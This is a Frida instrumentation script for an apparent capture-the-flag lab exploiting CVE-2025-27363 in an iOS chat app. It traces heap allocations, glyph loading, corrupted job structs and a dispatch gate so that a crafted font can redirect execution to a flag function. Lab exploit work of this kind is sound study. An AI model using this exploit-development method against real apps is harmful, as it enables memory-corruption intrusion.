// echochat_trace.js — Frida instrumentation for the EchoChat / CVE-2025-27363 lab.
//
// Turns the blind crash-and-guess loop into a real memory feedback loop:
//   * logs the custom FreeType allocator (ec_pass_alloc/realloc/free) so you can
//     see the undersized points buffer and which allocation sits next to gPlantedJob
//   * dumps the gPlantedJob struct after each FT_Load_Glyph
//   * prints the dispatch gate decision (off / base / target vs flag_reveal)
//
// Usage (device must have frida-server, or the IPA repacked with frida-gadget):
//   frida -U -f com.mobilehackinglab.EchoChat -l echochat_trace.js --no-pause
//   # or attach to the running app:
//   frida -U -n EchoChat -l echochat_trace.js
//
// Then (from your laptop) send a payload and foreground the app:
//   python3 -I poc.py run --to +<banner-number> --pdf evil_clean.pdf --count 6 --timeout 110
//
// Read the trace to learn exactly which source bytes reach gPlantedJob+0x8,
// then craft the winning font and fire it at the REMOTE lab instance.

'use strict';

const IMAGE_BASE = ptr('0x100000000');           // static Mach-O text base
const OFF = {
  gPlantedJob:               0xa8fb0,            // __bss
  ec_pass_alloc:             0x17198,
  ec_pass_realloc:           0x17370,
  ec_pass_free:              0x17310,
  FT_Load_Glyph:             0x044c0,
  ec_render_thumbnail:       0x17424,
  ec_dispatch_completion:    0x17848,
  normal_preview_completion: 0x1647c,
  flag_reveal:               0x1656c,
  processFontDataForPreview: 0x165a8,
};

function R(mod, name) { return mod.base.add(OFF[name]); }   // OFF[] are offsets from image base

function hex(p, n) {
  try { return hexdump(p, { length: n, ansi: false, header: false }); }
  catch (e) { return '<unreadable ' + p + '>'; }
}

function s32(p) { return p.readS32(); }

function main() {
  const mod = Process.findModuleByName('EchoChat') || Process.enumerateModules()[0];
  const slide = mod.base.sub(IMAGE_BASE);
  console.log('[*] EchoChat base=' + mod.base + '  slide=' + slide);

  const gJob   = mod.base.add(OFF.gPlantedJob);
  const aFlag  = mod.base.add(OFF.flag_reveal);
  const aNorm  = mod.base.add(OFF.normal_preview_completion);
  console.log('[*] gPlantedJob=' + gJob + '  flag_reveal=' + aFlag + '  normal=' + aNorm);
  console.log('[*] flag_reveal - normal = 0x' + aFlag.sub(aNorm).toString(16) + '  (need job[0x8] == this)');

  // --- custom FreeType allocator: watch sizes + which block neighbours gPlantedJob ---
  const allocs = [];   // keep last N
  function note(tag, size, ptrv) {
    const near = ptrv && !ptrv.isNull() &&
                 Math.abs(ptrv.sub(gJob).toInt32 ? ptrv.sub(gJob).toInt32() : 1e9) < 0x400;
    const line = '[alloc] ' + tag + ' size=' + size + ' -> ' + ptrv +
                 (near ? '   <== within 0x400 of gPlantedJob' : '');
    allocs.push(line);
    if (allocs.length > 64) allocs.shift();
    if (near) console.log(line);
  }

  // Windowed allocator trace: only record while inside FT_Load_Glyph.
  let inLoad = false;
  const smallAllocs = [];   // {size, ptr} for size<=64 during the load
  Interceptor.attach(R(mod, 'ec_pass_alloc'), {
    onEnter(a) { this.size = a[1].toInt32(); },
    onLeave(r) {
      if (inLoad && this.size > 0 && this.size <= 64 && !r.isNull())
        smallAllocs.push({ size: this.size, ptr: r });
    }
  });
  Interceptor.attach(R(mod, 'ec_pass_realloc'), {
    onEnter(a) { this.cur = a[1].toInt32(); this.nw = a[2].toInt32(); this.blk = a[3]; },
    onLeave(r) {
      if (inLoad && this.nw > 0 && this.nw <= 64 && !r.isNull())
        smallAllocs.push({ size: this.nw, ptr: r, cur: this.cur });
    }
  });

  // gPlantedJob is an ARRAY of pointers to the groomed job structs; snapshot their +0x8.
  const NJOBS = 24;
  function snapJobs() {
    const out = [];
    for (let i = 0; i < NJOBS; i++) {
      try {
        const jp = gJob.add(i * 8).readPointer();
        if (jp.isNull() || jp.compare(ptr('0x100000')) < 0) { out.push(null); continue; }
        out.push({ p: jp, off: s32(jp.add(0x8)), w: s32(jp.add(0x10)), h: s32(jp.add(0x18)) });
      } catch (e) { out.push(null); }
    }
    return out;
  }

  // --- FT_Load_Glyph: read face->face_index directly to confirm named-instance activation ---
  Interceptor.attach(R(mod, 'FT_Load_Glyph'), {
    onEnter(a) {
      console.log('\n===== FT_Load_Glyph ENTER =====');
      // FT_Load_Glyph(FT_Face face, FT_UInt glyph_index, FT_Int32 load_flags)
      const face = a[0], gi = a[1].toInt32(), fl = a[2].toInt32();
      let fiStr = '?', named = '?';
      try {
        const fi = face.add(0x8).readU64();           // FT_FaceRec.face_index @ +8
        fiStr = '0x' + fi.toString(16);
        named = (fi.and(0x7FFF0000).compare(0) !== 0);
      } catch (e) {}
      console.log('  face=' + face + ' glyph_index=' + gi + ' load_flags=0x' + fl.toString(16) +
                  '  face_index=' + fiStr + '  IS_NAMED_INSTANCE=' + named +
                  '   <-- needs TRUE to hit the GX_VAR OOB path');
      this.pre = snapJobs();
      smallAllocs.length = 0; inLoad = true;
    },
    onLeave(ret) {
      inLoad = false;
      console.log('[FT_Load_Glyph ret] 0x' + ret.toInt32().toString(16));
      // report the small allocations seen during the load (the 16-byte points buf is the CVE alloc)
      console.log('  small allocs (<=64B) during load: ' + smallAllocs.length);
      for (const a of smallAllocs) {
        const tag = (a.size === 16) ? '  <== 16B points buffer (CVE alloc @ ttgload.c:1909)' : '';
        console.log('    size=' + a.size + ' ptr=' + a.ptr + (a.cur !== undefined ? ' (realloc cur=' + a.cur + ')' : '') + tag);
        if (a.size <= 16) {
          // dump the OOB tail where pp2/pp3/pp4 land (+16/+32/+48) and flag our sentinel 0xf0/240
          console.log('      OOB tail: ' + hex(a.ptr, 0x50));
          for (let off = 0; off <= 0x48; off += 8) {
            try {
              const v = a.ptr.add(off).readS64();
              if (v.toNumber && v.toNumber() === 240) console.log('      *** 240 (0xF0) found at +0x' + off.toString(16) + ' ***');
            } catch (e) {}
          }
        }
      }
      const post = snapJobs();
      let changed = 0;
      for (let i = 0; i < NJOBS; i++) {
        const a = this.pre[i], b = post[i];
        if (!a || !b) continue;
        if (a.off !== b.off || a.w !== b.w || a.h !== b.h) {
          changed++;
          console.log('  [job[' + i + ']=' + b.p + ' CHANGED] off ' + a.off + '->' + b.off +
                      ' (0x' + (b.off >>> 0).toString(16) + ')  w ' + a.w + '->' + b.w +
                      '  h ' + a.h + '->' + b.h);
          console.log('   ' + hex(b.p, 0x30));
        }
      }
      if (!changed) console.log('  [no groomed job changed by this load]');
    }
  });

  // --- ec_render_thumbnail: the ctx->job the app actually reads (ctx[0x830]) ---
  Interceptor.attach(R(mod, 'ec_render_thumbnail'), {
    onEnter(a) {
      const ctx = a[0];
      const job = ctx.add(0x830).readPointer();
      console.log('\n[render] ctx=' + ctx + '  ctx[0x830]=job=' + job +
                  '  (gPlantedJob=' + gJob + (job.equals(gJob) ? '  SAME' : '  DIFFERENT') + ')');
      console.log('[render] job bytes: ' + hex(job, 0x40));
    }
  });

  // --- ec_dispatch_completion: the gate ---
  Interceptor.attach(R(mod, 'ec_dispatch_completion'), {
    onEnter(a) {
      const ctx  = a[0];
      const job  = ctx.add(0x830).readPointer();
      const base = ctx.add(0x28).readPointer();
      const off  = job.isNull() ? 0 : s32(job.add(0x8));
      const target = base.add(off);
      const win = target.equals(aFlag);
      console.log('\n########## DISPATCH GATE ##########');
      console.log('  base (ctx[0x28]) = ' + base + (base.equals(aNorm) ? '  (= normal_preview)' : ''));
      console.log('  off  (job[0x8])  = ' + off + '  (0x' + (off >>> 0).toString(16) + ')');
      console.log('  target = base+off = ' + target);
      console.log('  flag_reveal       = ' + aFlag);
      console.log(win ? '  >>>>> WIN: target == flag_reveal <<<<<'
                      : '  ----- miss: need off == 0x' + aFlag.sub(base).toString(16) + ' -----');
      console.log('###################################');
    }
  });

  // --- catch the gvar OOB crash: fault address, pc, source regs, nearby memory ---
  Process.setExceptionHandler(function (details) {
    try {
      console.log('\n!!!!!!!!!! EXCEPTION !!!!!!!!!!');
      console.log('  type=' + details.type + '  address(pc)=' + details.address +
                  '  (pc-slide=0x' + details.address.sub(mod.base).toString(16) + ')');
      const ma = details.memory;
      if (ma) {
        console.log('  mem.operation=' + ma.operation + '  mem.address(fault)=' + ma.address +
                    '  (fault-gJob=0x' + ma.address.sub(gJob).toString(16) +
                    ', fault-jobs[0]=0x' + ma.address.sub(jobPtr0() || ptr(0)).toString(16) + ')');
        console.log('  bytes @ fault-0x40:\n' + hex(ma.address.sub(0x40), 0x80));
      }
      const c = details.context;
      console.log('  x0=' + c.x0 + ' x1=' + c.x1 + ' x2=' + c.x2 + ' x3=' + c.x3 +
                  '\n  x4=' + c.x4 + ' x5=' + c.x5 + ' x8=' + c.x8 + ' x9=' + c.x9 +
                  '\n  sp=' + c.sp + ' lr=' + c.lr);
      try {
        console.log('  backtrace:\n   ' + Thread.backtrace(c, Backtracer.ACCURATE)
          .map(a => a + (a.compare(mod.base) >= 0 && a.compare(mod.base.add(0x200000)) < 0
                        ? '  (EchoChat+0x' + a.sub(mod.base).toString(16) + ')' : ''))
          .join('\n   '));
      } catch (e) {}
      console.log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n');
    } catch (e) { console.log('exc handler err: ' + e); }
    return false;   // let it crash after logging
  });

  function jobPtr0() { try { return gJob.readPointer(); } catch (e) { return null; } }

  console.log('[*] hooks installed (incl. exception handler). Send a payload and foreground the app.');
}

setImmediate(main);
